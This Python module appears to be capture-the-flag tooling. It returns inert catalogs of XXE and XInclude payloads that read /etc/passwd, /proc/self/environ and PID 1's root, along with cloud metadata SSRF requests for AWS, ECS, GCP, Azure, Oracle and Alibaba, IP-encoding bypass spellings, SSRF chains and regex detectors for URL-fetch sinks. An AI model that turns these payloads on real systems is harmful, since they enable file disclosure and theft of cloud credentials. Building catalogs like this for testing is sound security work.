#!/usr/bin/env python3
"""Inert XXE/XInclude and SSRF/cloud-metadata catalogs for saved evidence.

Nothing in this module performs I/O.  XML documents and URLs are returned as
plain strings for a player to review; supplied challenge material is searched
as bounded text and is never parsed or deserialized.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass
import html
import ipaddress
import re
from typing import Iterable


MAX_TEXT = 256_000
MAX_RESOURCE = 512
MAX_HOST = 253


class CatalogInputError(ValueError):
    """Raised for malformed or unbounded catalog inputs."""


@dataclass(frozen=True, slots=True)
class XMLCandidate:
    family: str
    name: str
    document: str
    purpose: str
    expected_signal: str
    requirements: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, object]:
        row = asdict(self)
        row.update({"inert": True, "offline": True, "network_requests": 0})
        return row


@dataclass(frozen=True, slots=True)
class SSRFCandidate:
    provider: str
    name: str
    url: str
    method: str
    headers: tuple[tuple[str, str], ...]
    chain_step: int
    purpose: str
    requirements: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, object]:
        row = asdict(self)
        row.update({"inert": True, "offline": True, "network_requests": 0})
        return row


@dataclass(frozen=True, slots=True)
class StaticFinding:
    category: str
    name: str
    evidence: str
    offset: int
    confidence: str

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


def _bounded_text(value: str | bytes | bytearray, label: str) -> str:
    if isinstance(value, str):
        text = value
    elif isinstance(value, (bytes, bytearray)):
        text = bytes(value).decode("utf-8", "replace")
    else:
        raise CatalogInputError(f"{label} must be text or bytes")
    if len(text) > MAX_TEXT:
        raise CatalogInputError(f"{label} exceeds {MAX_TEXT} characters")
    return text


def _resource(value: str) -> str:
    if not isinstance(value, str) or not value or len(value) > MAX_RESOURCE:
        raise CatalogInputError(f"resource must contain 1..{MAX_RESOURCE} characters")
    if any(ord(char) < 32 for char in value) or any(char in value for char in ('"', "'", "<", ">")):
        raise CatalogInputError("resource contains an XML/control delimiter")
    if "://" not in value:
        if not value.startswith("/"):
            raise CatalogInputError("a local resource must be an absolute path")
        value = "file://" + value
    scheme = value.split(":", 1)[0].lower()
    if scheme != "file":
        raise CatalogInputError("XXE/XInclude catalog accepts local file resources only")
    if not value.lower().startswith("file:///"):
        raise CatalogInputError("file resources must use an empty authority and absolute path")
    return value


def _xml_row(
    family: str,
    name: str,
    document: str,
    purpose: str,
    signal: str,
    *requirements: str,
) -> XMLCandidate:
    return XMLCandidate(family, name, document, purpose, signal, tuple(requirements))


def xxe_xinclude_catalog(
    resource: str = "/etc/hostname", marker: str = "R5D_XML_MARKER"
) -> tuple[XMLCandidate, ...]:
    """Return bounded general-entity, parameter-entity, and XInclude documents."""

    target = html.escape(_resource(resource), quote=True)
    if not isinstance(marker, str) or not re.fullmatch(r"[A-Za-z0-9_.:-]{1,64}", marker):
        raise CatalogInputError("marker must be 1..64 conservative ASCII characters")
    general = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r5d [<!ENTITY probe SYSTEM "{target}">]>\n'
        "<r5d>&probe;</r5d>"
    )
    internal_parameter = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r5d [<!ENTITY % define "<!ENTITY probe \'{marker}\'>">%define;]>\n'
        "<r5d>&probe;</r5d>"
    )
    nested = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r5d [<!ENTITY one "{marker}"><!ENTITY two "&one;:&one;">]>\n'
        "<r5d>&two;</r5d>"
    )
    xinclude = (
        '<r5d xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include href="{target}" parse="text"/>'
        "</r5d>"
    )
    fallback = (
        '<r5d xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<xi:include href="{target}" parse="text">'
        f"<xi:fallback>{marker}</xi:fallback>"
        "</xi:include></r5d>"
    )
    soap = (
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:xi="http://www.w3.org/2001/XInclude"><soap:Body><r5d>'
        f'<xi:include href="{target}" parse="text"/>'
        "</r5d></soap:Body></soap:Envelope>"
    )
    svg = (
        '<svg xmlns="http://www.w3.org/2000/svg" '
        'xmlns:xi="http://www.w3.org/2001/XInclude">'
        f'<text><xi:include href="{target}" parse="text"/></text></svg>'
    )
    return (
        _xml_row(
            "xxe",
            "general_entity_local_file",
            general,
            "test whether an external general entity can read a local file",
            "known bytes from the named resource replace &probe;",
            "DOCTYPE declarations are accepted",
            "external general entities are enabled",
        ),
        _xml_row(
            "xxe",
            "internal_parameter_entity",
            internal_parameter,
            "separate parameter-entity handling from external-resource access",
            f"the literal marker {marker} replaces &probe;",
            "internal DTD subsets are accepted",
        ),
        _xml_row(
            "xxe",
            "nested_internal_entity_control",
            nested,
            "measure bounded nested entity expansion without external I/O",
            f"the value {marker}:{marker} appears",
            "general entity expansion is enabled",
        ),
        _xml_row(
            "xinclude",
            "xinclude_text",
            xinclude,
            "test XInclude processing independently of DOCTYPE handling",
            "known resource bytes appear as text",
            "the application invokes XInclude processing",
        ),
        _xml_row(
            "xinclude",
            "xinclude_fallback_control",
            fallback,
            "distinguish disabled/failed inclusion from an ignored xi element",
            f"either resource bytes or the fallback marker {marker} appears",
            "XInclude fallback processing is enabled",
        ),
        _xml_row(
            "xinclude",
            "soap_body_xinclude",
            soap,
            "place an XInclude node in a SOAP body",
            "resource bytes appear inside the parsed SOAP body",
            "the SOAP stack forwards body XML to an XInclude-capable parser",
        ),
        _xml_row(
            "xinclude",
            "svg_xinclude",
            svg,
            "place an XInclude node in an SVG text context",
            "resource bytes appear in the rendered or serialized text node",
            "the SVG pipeline processes XInclude directives",
        ),
    )


# Confinement-revealing local resources.  Reading them through a confirmed XXE
# primitive maps *where* the parser's file access is confined (container, chroot,
# jail) rather than just proving a read works.  Each entry is (name, resource,
# purpose, expected_signal, why).  Resources are plain absolute paths; _resource
# wraps them as empty-authority file:// URIs.  Nothing here reads anything.
_CONFINEMENT_PROBES: tuple[tuple[str, str, str, str, str], ...] = (
    (
        "passwd_reachable",
        "/etc/passwd",
        "confirm ordinary local file reads succeed before mapping confinement",
        "the root:x:0:0 account line appears",
        "the XXE primitive can read a world-readable absolute path",
    ),
    (
        "hostname",
        "/etc/hostname",
        "read the kernel UTS hostname the process sees",
        "a single hostname token; a container id-shaped name hints at a container",
        "the process is allowed to read /etc/hostname",
    ),
    (
        "self_cgroup",
        "/proc/self/cgroup",
        "identify the container runtime from this process's control groups",
        "a docker/kubepods/containerd/lxc/libpod segment appears in a cgroup path",
        "procfs is mounted and /proc/self/cgroup is readable",
    ),
    (
        "init_cgroup",
        "/proc/1/cgroup",
        "compare PID 1's control groups with this process's to detect a cgroup namespace",
        "PID 1 and self differ, or both share a container scope",
        "procfs exposes /proc/1/cgroup to this process",
    ),
    (
        "self_mountinfo",
        "/proc/self/mountinfo",
        "map the filesystem root and overlay/bind boundaries of the confinement",
        ("no row is mounted at '/' (classic chroot into a plain directory: the kernel hides "
         "mounts outside the reader's root), the '/' row's root field (4th) is not '/' "
         "(root bind-mounted from a subdirectory), or '/' is overlay (container)"),
        "procfs is mounted and /proc/self/mountinfo is readable",
    ),
    # /proc/self/root is the reading process's own root, so under a chroot it
    # resolves to the same file as a direct read and can never reveal the jail.
    # PID 1's root link (/proc/1/root) does: it points at the namespace's real
    # root, so a differing /etc/hostname read through it exposes a chroot.  The
    # mountinfo row for "/" (self_mountinfo above) is the second signal.
    (
        "init_root_hostname",
        "/proc/1/root/etc/hostname",
        "read /etc/hostname through PID 1's root link to expose a chroot of this process",
        "a value differing from a direct /etc/hostname read indicates a changed root",
        "procfs is present and this process may follow PID 1's root link (same user or root)",
    ),
    (
        "self_environ",
        "/proc/self/environ",
        "read the process environment for confinement and injected-secret markers",
        "KUBERNETES_SERVICE_HOST/container env vars, or a flag placed in the environment",
        "procfs is mounted and the process may read its own environ",
    ),
)


def xxe_confinement_catalog(
    extra_resource: str | None = None,
) -> tuple[XMLCandidate, ...]:
    """Inert general-entity documents that map an XXE read's confinement.

    Each document reads one confinement-revealing local file (container control
    groups, the mount table, the process-root link, the environment) so a
    reviewer can map *where* a confirmed in-band XXE read is confined -- a bare
    container, a chroot/jail, or an unconfined host -- instead of only proving a
    read works.  ``extra_resource`` appends one operator-named absolute path
    (for example a suspected flag file) validated exactly like every other
    resource.  Nothing here performs I/O; documents are returned as strings.
    """

    probes = list(_CONFINEMENT_PROBES)
    if extra_resource is not None:
        safe = _resource(extra_resource)  # validate; raises CatalogInputError if unsafe
        local = safe[len("file://"):]
        if any(local == existing for _n, existing, *_r in probes):
            raise CatalogInputError("extra_resource duplicates a built-in confinement probe")
        probes.append((
            "operator_resource",
            local,
            "read one operator-named absolute path through the same XXE primitive",
            "the named resource's bytes replace the probe entity",
            "the resource exists and is readable within the confinement",
        ))
    rows: list[XMLCandidate] = []
    for name, resource, purpose, signal, requirement in probes:
        target = html.escape(_resource(resource), quote=True)
        document = (
            '<?xml version="1.0"?>\n'
            f'<!DOCTYPE r5d [<!ENTITY probe SYSTEM "{target}">]>\n'
            "<r5d>&probe;</r5d>"
        )
        rows.append(_xml_row(
            "xxe-confinement",
            name,
            document,
            purpose,
            signal,
            "DOCTYPE declarations are accepted",
            "external general entities are enabled",
            requirement,
        ))
    return tuple(rows)


def cloud_metadata_catalog(provider: str = "all") -> tuple[SSRFCandidate, ...]:
    """Return provider metadata requests as strings, including required headers."""

    if not isinstance(provider, str):
        raise CatalogInputError("provider must be text")
    wanted = provider.strip().lower()
    supported = {"all", "aws", "aws-ecs", "gcp", "azure", "oracle", "alibaba"}
    if wanted not in supported:
        raise CatalogInputError(f"unknown provider {provider!r}")
    rows = (
        SSRFCandidate(
            "aws",
            "imds_v2_token",
            "http://169.254.169.254/latest/api/token",
            "PUT",
            (("X-aws-ec2-metadata-token-ttl-seconds", "60"),),
            1,
            "obtain the short-lived token required by IMDSv2",
            ("the sink permits PUT and caller-controlled headers",),
        ),
        SSRFCandidate(
            "aws",
            "imds_v2_metadata",
            "http://169.254.169.254/latest/meta-data/",
            "GET",
            (("X-aws-ec2-metadata-token", "R5D_IMDS_TOKEN"),),
            2,
            "use the reviewed token value in a second metadata request",
            ("the first response body can be copied into a request header",),
        ),
        SSRFCandidate(
            "aws",
            "imds_v1_control",
            "http://169.254.169.254/latest/meta-data/",
            "GET",
            (),
            1,
            "identify whether legacy headerless IMDSv1 is enabled",
            ("the environment permits IMDSv1",),
        ),
        SSRFCandidate(
            "aws-ecs",
            "ecs_task_credentials",
            "http://169.254.170.2/R5D_RELATIVE_URI",
            "GET",
            (),
            1,
            "represent the task credential relative-URI flow",
            ("R5D_RELATIVE_URI is replaced only with challenge-supplied evidence",),
        ),
        SSRFCandidate(
            "gcp",
            "compute_metadata",
            "http://metadata.google.internal/computeMetadata/v1/",
            "GET",
            (("Metadata-Flavor", "Google"),),
            1,
            "test the GCP metadata header contract",
            ("the sink permits the required header or adds it itself",),
        ),
        SSRFCandidate(
            "azure",
            "instance_metadata",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "GET",
            (("Metadata", "true"),),
            1,
            "test the Azure instance metadata header contract",
            ("the sink permits the required header or adds it itself",),
        ),
        SSRFCandidate(
            "oracle",
            "opc_v2_metadata",
            "http://169.254.169.254/opc/v2/instance/",
            "GET",
            (("Authorization", "Bearer Oracle"),),
            1,
            "test OCI IMDSv2 header handling",
            ("the sink permits the required authorization header",),
        ),
        SSRFCandidate(
            "alibaba",
            "instance_metadata",
            "http://100.100.100.200/latest/meta-data/",
            "GET",
            (),
            1,
            "identify an Alibaba Cloud metadata endpoint",
            ("the workload runs with access to the link-local endpoint",),
        ),
    )
    return tuple(row for row in rows if wanted == "all" or row.provider == wanted)


def _host(value: str) -> ipaddress.IPv4Address:
    if not isinstance(value, str) or not value or len(value) > MAX_HOST:
        raise CatalogInputError("host must be bounded text")
    try:
        address = ipaddress.ip_address(value)
    except ValueError as exc:
        raise CatalogInputError("metadata bypass catalog requires an IPv4 literal") from exc
    if address.version != 4:
        raise CatalogInputError("metadata bypass catalog requires an IPv4 literal")
    return address


def _path(value: str) -> str:
    if (
        not isinstance(value, str)
        or not value.startswith("/")
        or len(value) > MAX_RESOURCE
        or any(ord(char) < 32 for char in value)
        or "#" in value
    ):
        raise CatalogInputError("path must be an absolute bounded URL path")
    return value


def metadata_bypass_encodings(
    host: str = "169.254.169.254", path: str = "/latest/meta-data/"
) -> tuple[SSRFCandidate, ...]:
    """Return alternate URL spellings used to compare parser normalization."""

    address = _host(host)
    clean_path = _path(path)
    octets = [int(part) for part in str(address).split(".")]
    integer = int(address)
    encoded_dots = str(address).replace(".", "%2e")
    double_dots = str(address).replace(".", "%252e")
    forms = (
        ("canonical", str(address), "ordinary parsed address"),
        ("single_decimal", str(integer), "32-bit decimal IPv4 normalization"),
        ("single_hex", f"0x{integer:08x}", "32-bit hexadecimal IPv4 normalization"),
        ("single_octal", f"0{integer:o}", "legacy 32-bit octal normalization"),
        ("dotted_hex", ".".join(f"0x{part:x}" for part in octets), "hexadecimal dotted components"),
        ("dotted_octal", ".".join(f"0{part:o}" for part in octets), "octal dotted components"),
        ("ipv6_mapped", f"[::ffff:{address}]", "IPv4-mapped IPv6 normalization"),
        ("percent_encoded_dots", encoded_dots, "percent decoding before resolution"),
        ("double_encoded_dots", double_dots, "two decoding layers before resolution"),
        ("trailing_dot", f"{address}.", "root-dot normalization"),
    )
    rows = [
        SSRFCandidate(
            "encoding",
            name,
            f"http://{spelling}{clean_path}",
            "GET",
            (),
            1,
            f"compare filter and URL-stack handling of {purpose}",
            ("the deployed URL parser supports this spelling",),
        )
        for name, spelling, purpose in forms
    ]
    rows.extend(
        (
            SSRFCandidate(
                "encoding",
                "userinfo_authority",
                f"http://allowed.invalid@{address}{clean_path}",
                "GET",
                (),
                1,
                "compare a prefix allowlist with parsed authority selection",
                ("a filter inspects the raw prefix instead of the parsed hostname",),
            ),
            SSRFCandidate(
                "encoding",
                "fragment_authority_decoy",
                f"http://{address}{clean_path}#@allowed.invalid/",
                "GET",
                (),
                1,
                "compare raw suffix checks with fragment removal",
                ("a filter treats fragment text as authority evidence",),
            ),
        )
    )
    return tuple(rows)


def ssrf_chain_catalog(marker_host: str = "r5d.invalid") -> tuple[dict[str, object], ...]:
    """Describe common multi-step SSRF chains without performing any step."""

    if (
        not isinstance(marker_host, str)
        or len(marker_host) > MAX_HOST
        or not re.fullmatch(r"[A-Za-z0-9.-]+", marker_host)
        or not marker_host.endswith(".invalid")
    ):
        raise CatalogInputError("marker_host must be a reserved .invalid hostname")
    chains = (
        (
            "allowlist_redirect_to_metadata",
            (
                f"supply an allowlisted redirect URL under {marker_host}",
                "observe only a supplied saved 3xx response and its Location handling",
                "compare the final destination against the metadata catalog",
            ),
            ("redirects are followed", "destination validation is not repeated after redirect"),
        ),
        (
            "parser_confusion_then_fetch",
            (
                "select one alternate authority spelling from metadata_bypass_encodings",
                "compare validation and fetch parser interpretations in saved evidence",
            ),
            ("two components normalize the URL differently",),
        ),
        (
            "hostname_resolution_gap",
            (
                f"use only the inert placeholder http://{marker_host}/metadata",
                "compare whether validation pins a resolved address for the later fetch",
            ),
            ("validation and use perform separate resolution",),
        ),
        (
            "imds_v2_two_request_flow",
            (
                "review the imds_v2_token descriptor",
                "copy a real challenge-produced token only into the documented token header",
                "review the imds_v2_metadata descriptor",
            ),
            ("method, headers, and response-to-request data flow are controllable",),
        ),
        (
            "scheme_upgrade",
            (
                "identify a saved redirect from an accepted scheme",
                "compare whether the redirect target scheme is revalidated",
                "select a protocol-specific inert string only after source evidence confirms support",
            ),
            ("redirect handling accepts a scheme rejected at initial validation",),
        ),
    )
    return tuple(
        {
            "rank": rank,
            "name": name,
            "steps": steps,
            "requirements": requirements,
            "inert": True,
            "offline": True,
            "network_requests": 0,
        }
        for rank, (name, steps, requirements) in enumerate(chains, 1)
    )


_STATIC_PATTERNS: tuple[tuple[str, str, str, re.Pattern[str]], ...] = (
    (
        "ssrf_sink",
        "url_fetch_api",
        "medium",
        re.compile(r"(?i)\b(?:requests\.(?:get|post|request)|urlopen|httpclient|curl_exec|fetch)\s*\("),
    ),
    (
        "ssrf_validation",
        "raw_prefix_allowlist",
        "medium",
        re.compile(r"(?i)\b(?:startsWith|startswith)\s*\([^\n]{0,160}(?:https?://|allowed|whitelist)"),
    ),
    (
        "ssrf_validation",
        "redirect_following",
        "medium",
        re.compile(r"(?i)\b(?:allow_redirects|followRedirects?|maxRedirects?)\b"),
    ),
    (
        "metadata",
        "link_local_address",
        "high",
        re.compile(r"\b(?:169\.254\.169\.254|169\.254\.170\.2|100\.100\.100\.200)\b"),
    ),
    (
        "metadata",
        "provider_header",
        "high",
        re.compile(r"(?i)\b(?:Metadata-Flavor|X-aws-ec2-metadata-token|X-aws-ec2-metadata-token-ttl-seconds)\b"),
    ),
    (
        "ssrf_defense",
        "private_address_check",
        "medium",
        re.compile(r"(?i)\b(?:is_private|isPrivate|loopback|link[-_ ]local|private[-_ ]ip)\b"),
    ),
)


def analyze_saved_ssrf_evidence(
    supplied_text: str | bytes | bytearray,
) -> tuple[StaticFinding, ...]:
    """Search supplied source/transcripts for URL-fetch and metadata evidence."""

    text = _bounded_text(supplied_text, "supplied_text")
    rows: list[StaticFinding] = []
    for category, name, confidence, pattern in _STATIC_PATTERNS:
        match = pattern.search(text)
        if match:
            rows.append(
                StaticFinding(
                    category,
                    name,
                    text[max(0, match.start() - 48) : min(len(text), match.end() + 96)],
                    match.start(),
                    confidence,
                )
            )
    return tuple(sorted(rows, key=lambda row: (row.offset, row.category, row.name)))


def rows_as_dicts(
    rows: Iterable[XMLCandidate | SSRFCandidate | StaticFinding],
) -> tuple[dict[str, object], ...]:
    out = []
    for row in rows:
        to_dict = getattr(row, "to_dict", None)
        if not callable(to_dict):
            raise CatalogInputError("each row must expose a to_dict() method")
        out.append(to_dict())
    return tuple(out)
